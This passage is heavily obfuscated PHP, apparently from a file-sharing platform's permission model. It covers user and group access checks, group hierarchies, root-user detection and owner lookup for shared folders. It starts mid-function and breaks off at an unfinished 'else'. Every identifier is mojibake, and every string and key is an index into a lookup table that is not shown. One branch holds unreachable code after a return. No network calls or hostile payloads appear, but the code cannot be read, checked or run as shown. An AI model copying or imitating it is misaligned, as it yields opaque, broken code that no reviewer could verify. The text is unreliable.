$‡•¦À±[$ºœ•Ïú‚[1667]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÀÓµ¡· = $‡•¦À±[$ºœ•Ïú‚[1667]] ? $‡•¦À±[$ºœ•Ïú‚[1667]] : $‡•¦À±[$ºœ•Ïú‚[1857]]; if ($‡•¦À±[$ºœ•Ïú‚[1667]] && $‡•¦À±[$ºœ•Ïú‚[1667]] == $¦ëÁ×·) { continue; } $»Åãß—ì[] = array($ºœ•Ïú‚[402] => $ê´àèğ¥[$ºœ•Ïú‚[402]], $ºœ•Ïú‚[411] => $Îõ¢à—Ø, $ºœ•Ïú‚[505] => intval($ÀÓµ¡·), $ºœ•Ïú‚[1961] => isset($‹ûèá³[$ºœ•Ïú‚[399]]) ? intval($‹ûèá³[$ºœ•Ïú‚[399]]) : 0, $ºœ•Ïú‚[2017] => isset($‹ûèá³[$ºœ•Ïú‚[2017]]) ? intval($‹ûèá³[$ºœ•Ïú‚[2017]]) : -1); } $»Åãß—ì[] = array($ºœ•Ïú‚[402] => $ê´àèğ¥[$ºœ•Ïú‚[402]], $ºœ•Ïú‚[411] => SourceModel::TYPE_USER, $ºœ•Ïú‚[505] => intval($¦ëÁ×·), $ºœ•Ïú‚[1961] => intval($ì«îæÌü), $ºœ•Ïú‚[2017] => -1); $this->where(array($ºœ•Ïú‚[417] => $ê´àèğ¥[$ºœ•Ïú‚[402]]))->delete(); $this->addAll($»Åãß—ì); } return !0; } public function get($¤Œæ†›ı) { $Ó¼§éÂ‹ = $this->getSourceList(array($¤Œæ†›ı), !0); return $Ó¼§éÂ‹[0]; } public function getSourceList($Î°Õıöë, $‰’›öœ = false, $î»ƒŞÁ“ = false) { $íâ¿ÜçĞ =& $_SERVER[Ì¥ŞÒ°£]; if (!$Î°Õıöë) { return array(); } $õû¬À–» = Model($íâ¿ÜçĞ[1341]); if (!$‰’›öœ && count($Î°Õıöë) == 1) { $‰’›öœ = array(); $‰’›öœ[$Î°Õıöë[0]] = $õû¬À–»->sourceInfo($Î°Õıöë[0]); } if (!$‰’›öœ) { $â³ƒê»œ = array($íâ¿ÜçĞ[417] => array($íâ¿ÜçĞ[418], $Î°Õıöë)); $‰’›öœ = $õû¬À–»->field($íâ¿ÜçĞ[2041])->where($â³ƒê»œ)->select(); $‰’›öœ = array_to_keyvalue($‰’›öœ, $íâ¿ÜçĞ[402]); } $˜ƒËÈà = $Î°Õıöë; foreach ($‰’›öœ as $å®üØ‚÷ => $ É¤ˆµ“) { $Õˆ°ºŒÈ = $õû¬À–»->parentLevelArray($ É¤ˆµ“[$íâ¿ÜçĞ[521]]); $˜ƒËÈà = array_merge($˜ƒËÈà, array($å®üØ‚÷), array_reverse($Õˆ°ºŒÈ)); } $˜ƒËÈà = array_values(array_unique($˜ƒËÈà)); if (!$˜ƒËÈà) { return array(); } $¤Ûˆêã’ = $this->sourceAuthSelect($˜ƒËÈà); $Ó»Œšˆµ = array(); foreach ($˜ƒËÈà as $º¡£‘Ó‚) { if (isset($¤Ûˆêã’[$º¡£‘Ó‚])) { $Ó»Œšˆµ[$º¡£‘Ó‚] = $¤Ûˆêã’[$º¡£‘Ó‚]; } } $à“ØÉ»— = $this->userIsRoot($î»ƒŞÁ“); $°±Ì»òĞ = AuthModel::authAll(); $å¦Éğ†¬ = array($íâ¿ÜçĞ[414] => $°±Ì»òĞ, $íâ¿ÜçĞ[2042] => array($íâ¿ÜçĞ[419] => 0, $íâ¿ÜçĞ[1863] => $°±Ì»òĞ, $íâ¿ÜçĞ[420] => LNG($íâ¿ÜçĞ[2043]), $íâ¿ÜçĞ[1880] => $íâ¿ÜçĞ[2044])); $Ìİ¥âÏ = array(); foreach ($‰’›öœ as $º¡£‘Ó‚ => $¦€Ğ›ìÕ) { if ($à“ØÉ»— && $GLOBALS[$íâ¿ÜçĞ[6]][$íâ¿ÜçĞ[1876]]) { $Ìİ¥âÏ[$º¡£‘Ó‚] = $å¦Éğ†¬; continue; } $Ìİ¥âÏ[$º¡£‘Ó‚] = $this->makeSourceAuth($¦€Ğ›ìÕ, $Ó»Œšˆµ, $î»ƒŞÁ“); } return $Ìİ¥âÏ; } public function authDeepCheck($¶ïş¾‘ı, $¼¼Äñ ø = false) { $ŸüƒîÚÈ =& $_SERVER[Ì¥ŞÒ°£]; $¼¼Äñ ø = $¼¼Äñ ø ? $¼¼Äñ ø : USER_ID; $ï¡§İÛ¬ = $this->makeAuthDeep($¼¼Äñ ø); if (!in_array($¶ïş¾‘ı, $ï¡§İÛ¬[$ŸüƒîÚÈ[2045]])) { return !1; } $÷·Á„ö´ = array(); foreach ($ï¡§İÛ¬[$ŸüƒîÚÈ[2046]] as $‰„„™öé => $—©òµ™÷) { if (!in_array($¶ïş¾‘ı, $—©òµ™÷)) { continue; } $÷·Á„ö´[] = $‰„„™öé; } if (!$÷·Á„ö´) { return !1; } $ŸÓå—ÆÊ = $÷·Á„ö´ ? $÷·Á„ö´[0] : $¶ïş¾‘ı; return array($ŸüƒîÚÈ[414] => -1, $ŸüƒîÚÈ[467] => array($ŸüƒîÚÈ[419] => $ŸüƒîÚÈ[1194], $ŸüƒîÚÈ[1863] => $ŸüƒîÚÈ[197], $ŸüƒîÚÈ[420] => LNG($ŸüƒîÚÈ[2047]), $ŸüƒîÚÈ[1880] => $ŸüƒîÚÈ[2048]), $ŸüƒîÚÈ[2049] => LNG($ŸüƒîÚÈ[2050]), $ŸüƒîÚÈ[2051] => $this->sourceAuthInfo($ŸÓå—ÆÊ)); } protected function makeAuthDeep($üÕÂ = false) { $Ú»è¸÷ =& $_SERVER[Ì¥ŞÒ°£]; static $¬ùÑœÅ = array(); $üÕÂ = $üÕÂ ? $üÕÂ : USER_ID; if (isset($¬ùÑœÅ[$üÕÂ])) { return $¬ùÑœÅ[$üÕÂ]; } $ÀıÑ­˜Ù = Model($Ú»è¸÷[2052])->listData(); $øÅ¡ÅÚ© = array(); foreach ($ÀıÑ­˜Ù as $¨µµÛ”ä) { if ($¨µµÛ”ä[$Ú»è¸÷[413]] == 0 && $¨µµÛ”ä[$Ú»è¸÷[1879]] == $Ú»è¸÷[88]) { $øÅ¡ÅÚ©[] = $¨µµÛ”ä[$Ú»è¸÷[399]]; } } $Š¡Ç‰  = $this->userGroupParents($üÕÂ); $ªú²´©è = array($Ú»è¸÷[411] => SourceModel::TYPE_USER, $Ú»è¸÷[505] => $üÕÂ); if ($Š¡Ç‰ ) { $ªú²´©è = array(array($Ú»è¸÷[411] => SourceModel::TYPE_USER, $Ú»è¸÷[505] => $üÕÂ), array($Ú»è¸÷[411] => SourceModel::TYPE_GROUP, $Ú»è¸÷[505] => array($Ú»è¸÷[418], $Š¡Ç‰ )), $Ú»è¸÷[1005] => $Ú»è¸÷[1955]); } $€ó¿ç÷¯ = $this->field($Ú»è¸÷[2053])->where($ªú²´©è)->select(); $ş›ÆŞ“¢ = array(); $‡ÏÍÔÜŞ = array_to_keyvalue_group($€ó¿ç÷¯, $Ú»è¸÷[402]); foreach ($‡ÏÍÔÜŞ as $î¢ˆ’µÔ => $†üÉ·Å™) { $ÚËó¸¢ = $this->authArrayCheck($†üÉ·Å™, $üÕÂ); if ($ÚËó¸¢[$Ú»è¸÷[414]] > 0) { $ş›ÆŞ“¢[] = $î¢ˆ’µÔ . $Ú»è¸÷[12]; } } if ($Š¡Ç‰ ) { $‡ùŠ•úÓ = Model($Ú»è¸÷[522]); foreach ($Š¡Ç‰  as $»Ş®Ïª÷) { $ËÖğ›¦ = $‡ùŠ•úÓ->getInfo($»Ş®Ïª÷); if (!$ËÖğ›¦ || !is_array($ËÖğ›¦[$Ú»è¸÷[86]])) { continue; } $ş›ÆŞ“¢[] = $ËÖğ›¦[$Ú»è¸÷[86]][$Ú»è¸÷[402]]; } } $¼¶¨–ÖÙ = array(); $ÎõµßŸ = $Š¡Ç‰ ; $ „ˆ» = Model($Ú»è¸÷[1341]); $‡ùŠ•úÓ = Model($Ú»è¸÷[522]); $º‹°Ù¤„ = array(); $©ò•Ô¾Œ = array(); $œ‚œš = array(); $ ‹Á“İÏ = array(); if ($ş›ÆŞ“¢) { $Ñ€¹Óù“ = $ „ˆ»->where(array($Ú»è¸÷[402] => array($Ú»è¸÷[418], $ş›ÆŞ“¢)))->select(); foreach ($Ñ€¹Óù“ as $´­³”Œ) { $çğ¯Ïë¿ = $ „ˆ»->parentLevelArray($´­³”Œ[$Ú»è¸÷[521]]); $¼¶¨–ÖÙ = array_merge($¼¶¨–ÖÙ, $çğ¯Ïë¿); $ÎõµßŸ[] = $´­³”Œ[$Ú»è¸÷[505]]; $º‹°Ù¤„[$´­³”Œ[$Ú»è¸÷[402]]] = $çğ¯Ïë¿; $©ò•Ô¾Œ[$´­³”Œ[$Ú»è¸÷[402]]] = $´­³”Œ[$Ú»è¸÷[505]]; } } $ÎõµßŸ = array_values(array_unique($ÎõµßŸ)); $®Å•š°¦ = $ÎõµßŸ; foreach ($®Å•š°¦ as $»Ş®Ïª÷) { $ËÖğ›¦ = $‡ùŠ•úÓ->getInfo($»Ş®Ïª÷); $çğ¯Ïë¿ = $ „ˆ»->parentLevelArray($ËÖğ›¦[$Ú»è¸÷[521]]); $ÎõµßŸ = array_merge($ÎõµßŸ, $çğ¯Ïë¿); } $ÎõµßŸ = array_values(array_unique($ÎõµßŸ)); foreach ($ÎõµßŸ as $»Ş®Ïª÷) { $ËÖğ›¦ = $‡ùŠ•úÓ->getInfo($»Ş®Ïª÷); $¼¶¨–ÖÙ[] = $ËÖğ›¦[$Ú»è¸÷[86]][$Ú»è¸÷[402]]; $œ‚œš[$»Ş®Ïª÷] = $ËÖğ›¦[$Ú»è¸÷[86]][$Ú»è¸÷[402]]; $ ‹Á“İÏ[$»Ş®Ïª÷] = $ „ˆ»->parentLevelArray($ËÖğ›¦[$Ú»è¸÷[521]]); } foreach ($º‹°Ù¤„ as $ŞÓ§¯á¡ => $ØŞÊ€¹ä) { $ß±¥ªÙ¿ = $©ò•Ô¾Œ[$ŞÓ§¯á¡]; if (!$ß±¥ªÙ¿ || !$œ‚œš[$ß±¥ªÙ¿]) { continue; } $’ä†çØ• = array(); foreach ($ ‹Á“İÏ[$ß±¥ªÙ¿] as $»Ş®Ïª÷) { $’ä†çØ•[] = $œ‚œš[$»Ş®Ïª÷]; } $º‹°Ù¤„[$ŞÓ§¯á¡] = array_merge($’ä†çØ•, $ØŞÊ€¹ä); } $¼¶¨–ÖÙ = array_values(array_unique($¼¶¨–ÖÙ)); $İ­˜˜Àô = array($Ú»è¸÷[2045] => $¼¶¨–ÖÙ, $Ú»è¸÷[2046] => $º‹°Ù¤„); $¬ùÑœÅ[$üÕÂ] = $İ­˜˜Àô; return $İ­˜˜Àô; } private function makeSourceAuth($¿‰æô¯¶, $ğôßÙùş, $¿´û²îø = false) { $ñáªËÓ£ =& $_SERVER[Ì¥ŞÒ°£]; $¾ñêÊ‹Ç = $ñáªËÓ£[88]; $ŠØ˜ú‚é = $¿‰æô¯¶[$ñáªËÓ£[505]]; $»Ò¬»Ø = $¿‰æô¯¶[$ñáªËÓ£[411]] == SourceModel::TYPE_GROUP; $ï¯Ñ = $»Ò¬»Ø ? $this->groupRootAuth($ŠØ˜ú‚é, $¿´û²îø) : !1; if ($ï¯Ñ && Model($ñáªËÓ£[507])->authCheckAction($ï¯Ñ[$ñáªËÓ£[413]], $ñáªËÓ£[1878])) { return $this->groupAuthInfo($ï¯Ñ, $ŠØ˜ú‚é); } $Ø»³™‘… = Model($ñáªËÓ£[1341])->parentLevelArray($¿‰æô¯¶[$ñáªËÓ£[521]]); $Ø»³™‘… = array_merge(array($¿‰æô¯¶[$ñáªËÓ£[402]]), array_reverse($Ø»³™‘…)); $´åÍ·²Ü = !1; foreach ($Ø»³™‘… as $§××ú) { if (!isset($ğôßÙùş[$§××ú])) { continue; } $õ‰ËÅÛ = $this->authMake($ğôßÙùş[$§××ú], $¿´û²îø); if ($õ‰ËÅÛ[$ñáªËÓ£[467]]) { $´åÍ·²Ü = $õ‰ËÅÛ; break; } } if (!$»Ò¬»Ø) { return $´åÍ·²Ü; } if (!$´åÍ·²Ü && $ï¯Ñ) { $´åÍ·²Ü = $this->groupAuthInfo($ï¯Ñ, $ŠØ˜ú‚é); } if (!$´åÍ·²Ü) { $°ˆŸàœé = Model($ñáªËÓ£[522])->getInfo($ŠØ˜ú‚é); $é®±“¹Å = explode($ñáªËÓ£[50], trim($°ˆŸàœé[$ñáªËÓ£[521]], $ñáªËÓ£[50])); $é®±“¹Å = array_reverse($é®±“¹Å); foreach ($é®±“¹Å as $¥ËÙù£„) { if ($¥ËÙù£„ == $ñáªËÓ£[197] || $¥ËÙù£„ == $¾ñêÊ‹Ç) { continue; } $Ş‚å£Û = $this->groupRootAuth($¥ËÙù£„, $¿´û²îø); if (!$Ş‚å£Û) { continue; } $´åÍ·²Ü = $this->groupAuthInfo($Ş‚å£Û, $¥ËÙù£„); break; } } if (!$´åÍ·²Ü || $´åÍ·²Ü[$ñáªËÓ£[414]] <= 0) { $Êôôáá = $this->authDeepCheck($¿‰æô¯¶[$ñáªËÓ£[402]], $¿´û²îø); if ($Êôôáá) { $´åÍ·²Ü = $Êôôáá; } } return $´åÍ·²Ü; } private function userIsRoot($Ÿ»¡¡»© = false) { $©ïöÛÀã =& $_SERVER[Ì¥ŞÒ°£]; if (!$Ÿ»¡¡»© && _get($GLOBALS, $©ïöÛÀã[503])) { return !0; } $¹óªã£´ = Model($©ïöÛÀã[535])->getInfo($Ÿ»¡¡»©); $„«›Ù€è = Model($©ïöÛÀã[2054])->listData($¹óªã£´[$©ïöÛÀã[1548]]); if ($„«›Ù€è && $„«›Ù€è[$©ïöÛÀã[511]][$©ïöÛÀã[2055]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¤®ÁÚû—) { $¶…¬›è =& $_SERVER[Ì¥ŞÒ°£]; $„Îşôƒà = Model($¶…¬›è[1341]); $ƒ÷¯Â® = $„Îşôƒà->sourceInfo($¤®ÁÚû—); if (!$ƒ÷¯Â®) { return !1; } $„Îşôƒà->groupPathDisplay($ƒ÷¯Â®); $¹ÊÈé = array($ƒ÷¯Â®); $¹ÊÈé = $„Îşôƒà->_listAppendPath($¹ÊÈé); $ƒ÷¯Â® = $¹ÊÈé[0]; $ÆÜÁÏş = $ƒ÷¯Â®[$¶…¬›è[519]]; if (isset($ƒ÷¯Â®[$¶…¬›è[527]])) { $®”°×‹ = explode($¶…¬›è[8], trim($ƒ÷¯Â®[$¶…¬›è[519]], $¶…¬›è[8])); array_shift($®”°×‹); $ÆÜÁÏş = $ƒ÷¯Â®[$¶…¬›è[525]] . $¶…¬›è[2056] . implode($¶…¬›è[8], $®”°×‹); } return array($¶…¬›è[420] => $ƒ÷¯Â®[$¶…¬›è[32]], $¶…¬›è[84] => KodIO::make($ƒ÷¯Â®[$¶…¬›è[402]]), $¶…¬›è[2057] => $ÆÜÁÏş); } private function groupAuthInfo($ÛøÖæØ, $¯Ì÷Á¿) { $¢şË¬Ş =& $_SERVER[Ì¥ŞÒ°£]; $ıÅ¾ò‡ = Model($¢şË¬Ş[522])->getInfo($¯Ì÷Á¿); return array($¢şË¬Ş[2058] => intval($ÛøÖæØ[$¢şË¬Ş[413]]), $¢şË¬Ş[2042] => $ÛøÖæØ, $¢şË¬Ş[2059] => LNG($¢şË¬Ş[2060]), $¢şË¬Ş[2051] => array($¢şË¬Ş[420] => $ıÅ¾ò‡[$¢şË¬Ş[32]], $¢şË¬Ş[84] => KodIO::make($ıÅ¾ò‡[$¢şË¬Ş[86]][$¢şË¬Ş[402]]), $¢şË¬Ş[2057] => $ıÅ¾ò‡[$¢şË¬Ş[526]])); } protected function groupRootAuth($¶Ù›úŸÎ, $ÄÖ”¢Å = false) { $•¯¡Ã› =& $_SERVER[Ì¥ŞÒ°£]; $ÄÖ”¢Å = $ÄÖ”¢Å ? $ÄÖ”¢Å : USER_ID; $ëµÔïÀÓ = $ÄÖ”¢Å . $•¯¡Ã›[2061] . $¶Ù›úŸÎ; static $ÁÆ˜íî¨ = array(); if (isset($ÁÆ˜íî¨[$ëµÔïÀÓ])) { return $ÁÆ˜íî¨[$ëµÔïÀÓ]; } $ìÃÕ®² = Model($•¯¡Ã›[522])->getInfo($¶Ù›úŸÎ); $›Ôïú˜ƒ = $this->userGroupList($ÄÖ”¢Å); $ÍÏí™Şå = isset($›Ôïú˜ƒ[$¶Ù›úŸÎ]) ? $›Ôïú˜ƒ[$¶Ù›úŸÎ][$•¯¡Ã›[413]] : !1; if ($ÍÏí™Şå && Model($•¯¡Ã›[507])->authCheckAction($ÍÏí™Şå[$•¯¡Ã›[413]], $•¯¡Ã›[1878])) { $ÁÆ˜íî¨[$ëµÔïÀÓ] = $ÍÏí™Şå; return $ÍÏí™Şå; } $Õ³÷­Ÿæ = $this->sourceAuthSelect($ìÃÕ®²[$•¯¡Ã›[86]][$•¯¡Ã›[402]]); $©ûø¨Ö = $Õ³÷­Ÿæ ? $this->authMake($Õ³÷­Ÿæ, $ÄÖ”¢Å) : !1; $û¤¨ë…â = $©ûø¨Ö ? $©ûø¨Ö[$•¯¡Ã›[467]] : !1; $ÁÆ˜íî¨[$ëµÔïÀÓ] = $û¤¨ë…â ? $û¤¨ë…â : $ÍÏí™Şå; return $ÁÆ˜íî¨[$ëµÔïÀÓ]; } public function authOwnerApply($—È×Ğå) { $›‡×è²í =& $_SERVER[Ì¥ŞÒ°£]; if (empty($—È×Ğå[$›‡×è²í[413]]) || isset($—È×Ğå[$›‡×è²í[2062]]) && $—È×Ğå[$›‡×è²í[2062]]) { return $—È×Ğå; } if (AuthModel::authCheckRoot($—È×Ğå[$›‡×è²í[413]][$›‡×è²í[414]])) { return $—È×Ğå; } $«‚‹–³Û = Model($›‡×è²í[1341])->parentLevelArray($—È×Ğå[$›‡×è²í[521]]); $«‚‹–³Û = array_merge(array($—È×Ğå[$›‡×è²í[402]]), array_reverse($«‚‹–³Û)); $²Ãá² = $this->sourceAuthSelect($«‚‹–³Û); $—€‹äÍ = array(); $½ˆİË¤ê = array(); foreach ($²Ãá² as $›ğ¢Ë¹ => $ŸğŒ”Çº) { $šˆñÎóÛ = $this->authFolderOwnerUser($ŸğŒ”Çº); $—€‹äÍ[$›ğ¢Ë¹] = $šˆñÎóÛ; $½ˆİË¤ê = array_merge($½ˆİË¤ê, $šˆñÎóÛ[$›‡×è²í[600]]); if ($šˆñÎóÛ[$›‡×è²í[2063]]) { break; } } if (count($½ˆİË¤ê) == 0) { $½ˆİË¤ê = $this->authFolderOwnerGroup($—È×Ğå[$›‡×è²í[505]]); } $½ˆİË¤ê = array_unique($½ˆİË¤ê); if (AuthModel::authCheckRoot($—È×Ğå[$›‡×è²í[413]][$›‡×è²í[414]])) { $½ˆİË¤ê[] = USER_ID; } $—È×Ğå[$›‡×è²í[413]][$›‡×è²í[2064]] = Model($›‡×è²í[513])->userListInfo($½ˆİË¤ê); return $—È×Ğå; } private function authFolderOwnerGroup($›åÖã¦Û) { $«¬Ş„áõ =& $_SERVER[Ì¥ŞÒ°£]; $à¤´ëÊ± = Model($«¬Ş„áõ[1947])->where(array($«¬Ş„áõ[1857] => $›åÖã¦Û))->select(); $«Âò¤Ü± = array(); if (!$à¤´ëÊ±) { return $«Âò¤Ü±; } foreach ($à¤´ëÊ± as $ƒªÁ©¹´) { $¢ñ¼±Ì‚ = $this->authInfo($ƒªÁ©¹´); if (AuthModel::authCheckRoot($¢ñ¼±Ì‚[$«¬Ş„áõ[413]])) { $«Âò¤Ü±[] = $ƒªÁ©¹´[$«¬Ş„áõ[1667]]; } } return $«Âò¤Ü±; } private function authFolderOwnerUser($æãİèä) { $œ»ËÎß™ =& $_SERVER[Ì¥ŞÒ°£]; $ó ›çä = array(); $ù¡³£†× = !1; foreach ($æãİèä as $‹ÖŞ¹Î») { $¢‚›Õµ¤ = $this->authInfo($‹ÖŞ¹Î»); if ($‹ÖŞ¹Î»[$œ»ËÎß™[505]] == $œ»ËÎß™[197]) { $ù¡³£†× = !0; } if ($‹ÖŞ¹Î»[$œ»ËÎß™[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¢‚›Õµ¤[$œ»ËÎß™[413]])) { $ó ›çä[] = $‹ÖŞ¹Î»[$œ»ËÎß™[505]]; } } } return array($œ»ËÎß™[600] => $ó ›çä, $œ»ËÎß™[2063] => $ù¡³£†×); } public function authMake($ğç¼â†÷, $ÀŸèšÓ = false) { $™Òº‰ËÛ =& $_SERVER[Ì¥ŞÒ°£]; $ ØĞÎ = $this->authArrayCheck($ğç¼â†÷, $ÀŸèšÓ); if ($ ØĞÎ[$™Òº‰ËÛ[2065]]) { $ ØĞÎ[$™Òº‰ËÛ[2065]] = $this->sourceAuthInfo($ ØĞÎ[$™Òº‰ËÛ[2065]]); } return $ ØĞÎ; } public function authArrayCheck($Š‰’î›À, $Ñò­üŞ = false) { $×à°¿·¬ =& $_SERVER[Ì¥ŞÒ°£]; if (!$Š‰’î›À) { return array($×à°¿·¬[414] => 0, $×à°¿·¬[467] => !1); } $Ñò­üŞ = $Ñò­üŞ ? $Ñò­üŞ : USER_ID; $±’”Úˆ = 0; $ü•ã™ˆ‡ = 0; $–È¶¥‡„ = 0; $ÒÍÚêƒ = 0; $¯óÍäŸ£ = 0; $îÍàî²» = 0; $î¥˜âÛö = 1000; $á›½€¤² = 0; $†Ï„ãíæ = 0; $ôÈÅĞ¿ = 0; $ŒùÈâ‘í = 0; $Óïò˜ÌØ = array($×à°¿·¬[402] => 0); foreach ($Š‰’î›À as $Óïò˜ÌØ) { $ËîÂ¤ ´ = $this->authInfo($Óïò˜ÌØ); if (!$ËîÂ¤ ´) { continue; } $´¼İÍÊ = $Óïò˜ÌØ[$×à°¿·¬[505]]; $·²İÀ‹Á = intval($ËîÂ¤ ´[$×à°¿·¬[413]]); if ($Óïò˜ÌØ[$×à°¿·¬[411]] == SourceModel::TYPE_USER && $´¼İÍÊ == $Ñò­üŞ) { $±’”Úˆ = !0; $–È¶¥‡„ = $ËîÂ¤ ´; $ü•ã™ˆ‡ = $·²İÀ‹Á; } else { if ($Óïò˜ÌØ[$×à°¿·¬[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($´¼İÍÊ, $Ñò­üŞ)) { $ÒÍÚêƒ = !0; $¡­€µãÄ = $this->groupStepToUserGroup($´¼İÍÊ, $Ñò­üŞ); if ($¡­€µãÄ < $î¥˜âÛö) { $î¥˜âÛö = $¡­€µãÄ; $¯óÍäŸ£ = $·²İÀ‹Á; $îÍàî²» = $ËîÂ¤ ´; $á›½€¤² = $´¼İÍÊ; } if ($¡­€µãÄ == $î¥˜âÛö && $·²İÀ‹Á >= $¯óÍäŸ£) { $¯óÍäŸ£ = $·²İÀ‹Á; $îÍàî²» = $ËîÂ¤ ´; $á›½€¤² = $´¼İÍÊ; } } else { if ($´¼İÍÊ == $×à°¿·¬[197]) { $†Ï„ãíæ = !0; $ŒùÈâ‘í = $ËîÂ¤ ´; $ôÈÅĞ¿ = $·²İÀ‹Á; } } } } if ($±’”Úˆ) { $Ù¬ŸÉŞ = $ü•ã™ˆ‡; $ËîÂ¤ ´ = $–È¶¥‡„; $şªìàË = LNG($×à°¿·¬[2066]); } else { if ($ÒÍÚêƒ) { $Ù¬ŸÉŞ = $¯óÍäŸ£; $ËîÂ¤ ´ = $îÍàî²»; $Æ Ó™Ù® = Model($×à°¿·¬[522])->getInfo($á›½€¤²); $şªìàË = $×à°¿·¬[162] . $Æ Ó™Ù®[$×à°¿·¬[526]] . $×à°¿·¬[2067] . LNG($×à°¿·¬[2068]); } else { if ($†Ï„ãíæ) { $Ù¬ŸÉŞ = $ôÈÅĞ¿; $ËîÂ¤ ´ = $ŒùÈâ‘í; $şªìàË = LNG($×à°¿·¬[2039]); } else { $Ù¬ŸÉŞ = 0; $ËîÂ¤ ´ = !1; $şªìàË = $×à°¿·¬[12]; } } } $å¬ïñ»Â = array($×à°¿·¬[2058] => intval($Ù¬ŸÉŞ), $×à°¿·¬[2042] => $ËîÂ¤ ´, $×à°¿·¬[2059] => $şªìàË, $×à°¿·¬[2051] => $Óïò˜ÌØ[$×à°¿·¬[402]]); return $å¬ïñ»Â; } private function groupContainUser($€­ÅÛú, $”§ºå = false) { return in_array($€­ÅÛú, $this->userGroupParents($”§ºå)); } private function groupStepToUserGroup($¢éĞÆñ˜, $½¤ØÄìĞ = false) { $Ÿ¹ˆ§„ =& $_SERVER[Ì¥ŞÒ°£]; $ü›®çúç = $this->userGroupList($½¤ØÄìĞ); $şó×ŒÑ¤ = 1000; $œ˜“ÀéØ = $GLOBALS[$Ÿ¹ˆ§„[6]][$Ÿ¹ˆ§„[89]][$Ÿ¹ˆ§„[1960]] == 1; $•Õ¯í„ = $œ˜“ÀéØ ? 3 : 2; foreach ($ü›®çúç as $¡ş•›) { if ($¡ş•›[$Ÿ¹ˆ§„[1857]] == $¢éĞÆñ˜) { return 0; } $œñÔáÕ = explode($Ÿ¹ˆ§„[50], trim($¡ş•›[$Ÿ¹ˆ§„[521]], $Ÿ¹ˆ§„[50])); if ($œñÔáÕ[0] == $Ÿ¹ˆ§„[197] && count($œñÔáÕ) > $•Õ¯í„) { $ğßÃç¾ = array_reverse(array_slice($œñÔáÕ, $•Õ¯í„)); $ôÀşÊÒ = array_search($¢éĞÆñ˜, $ğßÃç¾); if ($ôÀşÊÒ !== !1 && $ôÀşÊÒ + 1 <= $şó×ŒÑ¤) { $şó×ŒÑ¤ = $ôÀşÊÒ + 1; } } } return $şó×ŒÑ¤; } private function userGroupList($€©ÃÙòÜ = false) { $¡ÊÆ® ï =& $_SERVER[Ì¥ŞÒ°£]; static $Ô…áÑØ× = array(); if (isset($Ô…áÑØ×[$€©ÃÙòÜ])) { return $Ô…áÑØ×[$€©ÃÙòÜ]; } $Ûô½²ˆ° = Model($¡ÊÆ® ï[535])->getInfo($€©ÃÙòÜ); $Ô…áÑØ×[$€©ÃÙòÜ] = array_to_keyvalue($Ûô½²ˆ°[$¡ÊÆ® ï[2040]], $¡ÊÆ® ï[1857]); return $Ô…áÑØ×[$€©ÃÙòÜ]; } public function userGroupParents($²ç¡”Ùœ) { $ã“ÓŒ° =& $_SERVER[Ì¥ŞÒ°£]; static $üşé¶× = array(); $²ç¡”Ùœ = $²ç¡”Ùœ ? $²ç¡”Ùœ : USER_ID; if (isset($üşé¶×[$²ç¡”Ùœ])) { return $üşé¶×[$²ç¡”Ùœ]; } $áŠÍò– = $this->userGroupList($²ç¡”Ùœ); $ŸÂÅ§Ø¤ = array(); $¾˜öË = $GLOBALS[$ã“ÓŒ°[6]][$ã“ÓŒ°[89]][$ã“ÓŒ°[1960]] == 1; $ÁßÎ®†Š = $¾˜öË ? 3 : 2; foreach ($áŠÍò– as $ºšÍâ) { $Îë•Ô·ğ = array($ºšÍâ[$ã“ÓŒ°[1857]]); $ğÍ×”š• = explode($ã“ÓŒ°[50], trim($ºšÍâ[$ã“ÓŒ°[521]], $ã“ÓŒ°[50])); if ($ğÍ×”š•[0] == $ã“ÓŒ°[197] && count($ğÍ×”š•) > $ÁßÎ®†Š) { $º—³‘ÅË = array_slice($ğÍ×”š•, $ÁßÎ®†Š); $Îë•Ô·ğ = array_merge($Îë•Ô·ğ, array_reverse($º—³‘ÅË)); } $ŸÂÅ§Ø¤ = array_merge($ŸÂÅ§Ø¤, $Îë•Ô·ğ); } $üşé¶×[$²ç¡”Ùœ] = array_unique($ŸÂÅ§Ø¤); return $üşé¶×[$²ç¡”Ùœ]; } public function authTargetInfoMake($©¶Ïó‰Ò) { $ªĞ¢°…Š =& $_SERVER[Ì¥ŞÒ°£]; $äØ¹éæê = array(); $øˆ˜ÏÍ = array(); foreach ($©¶Ïó‰Ò as $ÁıÕüå±) { if ($ÁıÕüå±[$ªĞ¢°…Š[411]] == SourceModel::TYPE_USER) { $äØ¹éæê[] = intval($ÁıÕüå±[$ªĞ¢°…Š[505]]); } else { if ($ÁıÕüå±[$ªĞ¢°…Š[411]] == SourceModel::TYPE_GROUP) { $øˆ˜ÏÍ[] = intval($ÁıÕüå±[$ªĞ¢°…Š[505]]); } } } if ($äØ¹éæê) { $äØ¹éæê = Model($ªĞ¢°…Š[513])->userListInfo($äØ¹éæê); } if ($øˆ˜ÏÍ) { $Åè»É”ú = array($ªĞ¢°…Š[1945] => array($ªĞ¢°…Š[418], $øˆ˜ÏÍ)); $øˆ˜ÏÍ = Model($ªĞ¢°…Š[522])->field($ªĞ¢°…Š[2069])->where($Åè»É”ú)->select(); $øˆ˜ÏÍ = array_to_keyvalue($øˆ˜ÏÍ, $ªĞ¢°…Š[1857]); } return array($ªĞ¢°…Š[2070] => $äØ¹éæê, $ªĞ¢°…Š[2071] => $øˆ˜ÏÍ); } public function authInfo($«Ì†®¬Õ) { $ä©ÑÆ¬û =& $_SERVER[Ì¥ŞÒ°£]; if ($«Ì†®¬Õ[$ä©ÑÆ¬û[1961]]) { $Æ£™ÜÂ¿ = Model($ä©ÑÆ¬û[507])->listData($«Ì†®¬Õ[$ä©ÑÆ¬û[1961]]); if (!$Æ£™ÜÂ¿) { return !1; $ğ°Úõİ = Model($ä©ÑÆ¬û[507])->listData(); $¬óÌ·Á  = array_filter_by_field($ğ°Úõİ, $ä©ÑÆ¬û[413], $ä©ÑÆ¬û[197]); return $¬óÌ·Á ; } $ÔÕÎ®šÓ = array_field_key($Æ£™ÜÂ¿, array($ä©ÑÆ¬û[399], $ä©ÑÆ¬û[32], $ä©ÑÆ¬û[413], $ä©ÑÆ¬û[1880], $ä©ÑÆ¬û[1881])); $ÔÕÎ®šÓ[$ä©ÑÆ¬û[2072]] = $«Ì†®¬Õ; return $ÔÕÎ®šÓ; } else 